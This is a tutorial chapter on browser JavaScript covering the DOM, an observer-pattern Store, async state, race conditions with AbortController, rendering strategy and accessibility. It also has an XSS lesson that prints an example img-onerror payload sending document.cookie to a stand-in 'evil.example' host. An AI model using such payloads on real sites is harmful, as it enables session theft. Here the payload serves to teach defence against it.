# 08 — JavaScript in the browser

> **Concept** → The code → Do it yourself → Check yourself

This is the chapter where you learn what a framework does — by doing it yourself,
once, in about 150 lines.

## The DOM

The **Document Object Model** is the browser's live object representation of the
page. Change it and the screen changes.

```js
const node = document.createElement('button');   // make an element
node.textContent = 'France';                     // set its text
node.className = 'countries__item';              // set its class
node.addEventListener('click', handler);         // respond to events
parent.append(node);                             // put it in the page
```

That is the entire API this project uses. Everything in `dom.js` is a
convenience wrapper over those five calls.

## `textContent` versus `innerHTML`: the security lesson

This is the most important paragraph in the chapter.

```js
element.innerHTML = `<h3>${event.title}</h3>`;   // ← DANGEROUS
```

`innerHTML` **parses the string as HTML**. If any part came from a database or a
user, then a title of:

```html
<img src=x onerror="fetch('https://evil.example?c='+document.cookie)">
```

becomes a real element, the `onerror` fires, and the attacker has your users'
cookies. That is **cross-site scripting (XSS)**, and it is the most common
serious front-end vulnerability.

```js
element.textContent = event.title;               // ← SAFE
```

`textContent` never parses. The browser treats the string as text, always. Our
`dom.js` only ever creates text nodes:

```js
parent.append(child instanceof Node ? child : document.createTextNode(String(child)));
```

**React escapes interpolated values for exactly this reason.** You are not doing
something React saves you from — you are doing it explicitly instead of
implicitly.

There is a test for it (`client/tests/dom.test.js`), including one that
demonstrates the unsafe version for contrast:

```js
it('renders markup in text as literal characters, not as elements', () => {
  const node = el('h3', {}, '<img src=x onerror="globalThis.__pwned = true">');
  assert.equal(node.querySelector('img'), null);
  assert.equal(globalThis.__pwned, undefined);
});
```

**The rule: `textContent` for text, `createElement` for structure, `innerHTML`
only for markup you wrote yourself.**

## The element builder

`dom.js` is 30 lines and turns nested `createElement` calls into something
readable:

```js
el('button', { class: 'countries__item', on: { click: () => select(code) } }, [
  el('span', { class: 'countries__name' }, country.name),
  el('span', { class: 'countries__code' }, country.code),
])
```

There is no magic here — it loops over the props and calls `setAttribute` or
assigns a property. Two details worth knowing:

**Attributes vs properties.** ARIA and `role` must be set with `setAttribute`
(they are attributes, and that is what assistive technology reads). `href`,
`disabled` and `textContent` are properties — typed, rather than strings.

**Falsy children are skipped**, so `condition && el(...)` works inline without
rendering the word "false".

## State: the `Store`

`Store.js` is 40 lines and is the **observer pattern**:

1. hold some state,
2. let interested parties `subscribe`,
3. on change, notify them.

```js
setState(patch) {
  const next = Object.freeze({ ...this.#state, ...patch });
  ...
  for (const listener of [...this.#listeners]) listener(next, previous);
}
```

Once you have seen this in 40 lines, every state library you meet later
(`useState`, Redux, Vue's reactivity) is a variation on it.

**Why bother, instead of setting variables and updating the DOM inline?**
Because with scattered variables there is no single answer to "what is on screen
right now?", and two parts of the UI eventually disagree — the heading says 1994
while the list below still shows 1969.

Three deliberate details:

- **State is replaced, never mutated.** `{ ...old, ...patch }` creates a new
  object, so `previous.events !== next.events` reliably means "this slice
  changed" — which is what the views use to skip work.
- **It is frozen**, so a view cannot mutate it by accident.
- **`setState` inside a listener throws** rather than looping forever. Failing
  loudly beats hanging the tab.

## The four states of remote data

```js
export const Async = Object.freeze({
  idle:    ()      => ({ status: 'idle',    data: null, error: null }),
  loading: ()      => ({ status: 'loading', data: null, error: null }),
  success: (data)  => ({ status: 'success', data,       error: null }),
  error:   (error) => ({ status: 'error',   data: null, error }),
});
```

Compare the usual alternative — separate `data`, `loading` and `error` variables
— which permits `loading === true` AND `error` set AND stale `data`, all at once.
Eight combinations, half of them nonsense.

One `status` field permits only the four states that are real. Every view is a
switch on it, and there is no way to render a contradiction.

**`idle` is the one people forget, and it is load-bearing here.** See below.

## State design: store only what the user chose

`App.js` stores two things the user actually decides:

```js
selectedYear, selectedCountryCode
```

Everything else is **derived**: when a selection changes, the matching request is
re-issued and its slice updated. There is no second copy of anything, so no two
panels can disagree.

> **If you can compute it, do not store it.** Almost every "the UI is showing
> stale data" bug is a stored copy of something derivable.

## Two bugs this design exists to prevent

### 1. Stale dependent data

```js
selectYear(year) {
  this.#cancel('events');
  this.#store.setState({
    selectedYear: year,
    selectedCountryCode: null,
    events: Async.idle(),      // ← this line
  });
  ...
}
```

Changing the year clears the country. Without also resetting `events` to `idle`,
the **previous country's events stay on screen under the new year's heading** —
plausible-looking and completely wrong. Nothing about the page looks broken.

The test that pins it:

```js
it('clears the chosen country and its events when the year changes', ...)
```

### 2. The race condition

Click 1914, then quickly click 1969. Two requests are in flight. If 1914's
response arrives **second**, it overwrites 1969's, and you are looking at 1914's
countries under a 1969 heading.

Invisible on a fast local network. Very visible on a phone.

```js
async #load(slice, request) {
  this.#cancel(slice);                       // abort the previous one
  const controller = new AbortController();
  this.#inFlight[slice] = controller;
  ...
  const data = await request(controller.signal);
  if (controller.signal.aborted) return;     // belt and braces
  this.#store.setState({ [slice]: Async.success(data) });
}
```

`AbortController` is the browser's cancellation primitive: pass `signal` to
`fetch` and calling `abort()` rejects it. **The bug is not made unlikely; it is
made impossible.**

`ApiClient` cooperates by re-throwing `AbortError` untouched rather than wrapping
it — an abort is a normal part of the lifecycle, not a failure to report.

## Rendering: the part a framework automates

`App` re-runs every view on every state change. Each view then decides how little
work to do — and the two views make **opposite, and both correct, choices**.

### `TimelineView` — surgical updates

A naive version would rebuild all 126 buttons whenever state changed. It would
work, and it would be wrong in ways you can feel:

- the focused button is destroyed mid-keypress, so keyboard navigation dies
- the horizontal scroll position jumps back to the start
- 126 elements are discarded and recreated to change one CSS class

So it separates two jobs:

```js
if (timeline.data.ticks !== this.#renderedTicks) this.#renderRail(ticks);  // rare
if (selectedYear !== this.#selectedYear) this.#applySelection(selectedYear); // common
```

`#applySelection` touches exactly two elements: the one losing selection and the
one gaining it.

**That bookkeeping is precisely what React's virtual DOM does for you
automatically.** Doing it by hand once tells you what you are buying when you
later choose a framework — and why the answer is not always "yes".

A test protects it:

```js
it('reuses the same button elements when only the selection changes', () => {
  const before = root.querySelector('[data-year="1968"]');
  view.update(ready(1968));
  assert.equal(before, root.querySelector('[data-year="1968"]'));
});
```

### `CountryListView` — full rebuild

A dozen elements whose contents change completely whenever the year changes. The
bookkeeping that pays for itself in the timeline would be pure overhead here.

**Match the technique to the problem.** A framework applies one strategy
everywhere, which is usually right and occasionally not.

## Events: bubbling and delegation

Events **bubble** from the element outward through its ancestors. So one listener
on the container handles all 126 buttons:

```js
el('div', { class: 'timeline__rail', on: { keydown: (e) => this.#handleKeyDown(e, ticks) } }, buttons)
```

That is **event delegation** — fewer listeners, and it keeps working when
children are added or removed.

`event.preventDefault()` stops the browser's default behaviour — here, stopping
the arrow keys from also scrolling the page.

## Keyboard support, properly

```js
const step = { ArrowRight: 1, ArrowLeft: -1, ArrowUp: -1, ArrowDown: 1 }[event.key];
const jump = { PageUp: -10, PageDown: 10 }[event.key];
```

Plus `Home`/`End`, clamped at both ends of the range. And **roving tabindex**:
exactly one year has `tabindex="0"`, the rest `-1`, so Tab reaches the timeline
once and the arrows move within it.

One detail worth stealing:

```js
if (this.#rail?.contains(document.activeElement) && document.activeElement !== next) {
  next.focus();
}
```

Only move focus if focus is **already inside the rail**. Stealing focus from
elsewhere on the page whenever data loads would be hostile.

## `fetch` and the mistake everyone makes

```js
const response = await fetch(url, { signal });
if (!response.ok) { ...throw... }        // ← easy to forget, and it matters
return response.json();
```

**`fetch` only rejects on network failure.** A 404 or a 500 is a perfectly
successful fetch with `response.ok === false`. Forgetting that check is the most
common bug in front-end HTTP code — the app quietly renders an error body as if
it were data.

`ApiClient` also handles the case where an error response is not JSON at all:

```js
const body = await response.json().catch(() => null);
```

A proxy or a crashed process returning an HTML 502 page is a real production
event.

## Do it yourself

1. **See the race condition.** In `ApiClient.get`, add a random delay before
   `fetch`:
   ```js
   await new Promise((r) => setTimeout(r, Math.random() * 2000));
   ```
   Click several years quickly. Now delete the `this.#cancel(slice)` line in
   `App.#load` and try again. Watch the panels disagree. Restore both.

2. **Reproduce the stale-data bug.** Remove `events: Async.idle()` from
   `selectYear`. Run `node --test client/tests/App.test.js`. Read the failure —
   it is the exact bug described above.

3. **Feel the naive re-render.** Make `TimelineView.update` always call
   `#renderRail`. Then Tab into the timeline and hold the right arrow. Watch
   focus and scroll break. That is what the bookkeeping buys.

4. **Try the XSS attack for real.** Add an event to `seedData.js` whose title is
   `<img src=x onerror="alert('pwned')">`, re-seed, and load the page. Nothing
   happens — the title renders as literal text. Now change `EventListView` to use
   `innerHTML` for the title and reload. **Then change it back.**

5. **Add a feature.** Filter events by category. Where does the state live — the
   `Store`, or the view? (Consider: should the filter survive changing country?)

6. **Deep-link it.** Put `selectedYear` and `selectedCountryCode` in the URL
   (`/1994/ZAF`) using `history.pushState` and the `popstate` event, so a link
   can be shared. This is where a router starts to earn its place.

## Check yourself

- Why does the project use `textContent` everywhere instead of `innerHTML`?
- Why does `TimelineView` avoid rebuilding its buttons, while `CountryListView`
  rebuilds freely?
- Why is `status` one field rather than three booleans?
- What does `AbortController` prevent?

<details>
<summary>Answers</summary>

- **`textContent`**: it never parses markup, so database or user content cannot
  become executable HTML. That is XSS prevention, and it is not optional.
- **Different strategies**: the timeline holds keyboard focus and scroll position
  across updates and has 126 children, so rebuilding destroys real state. The
  country list has a dozen children that all change together, so rebuilding is
  simpler and costs nothing. Match the technique to the problem.
- **One `status`**: three booleans allow eight combinations, half nonsense
  (`loading && error`). A single status permits only the four real states.
- **`AbortController`**: it cancels the in-flight request when a newer one
  starts, so a slow earlier response cannot overwrite a fast later one.

</details>

→ Next: [09 — Testing](09-testing.md)
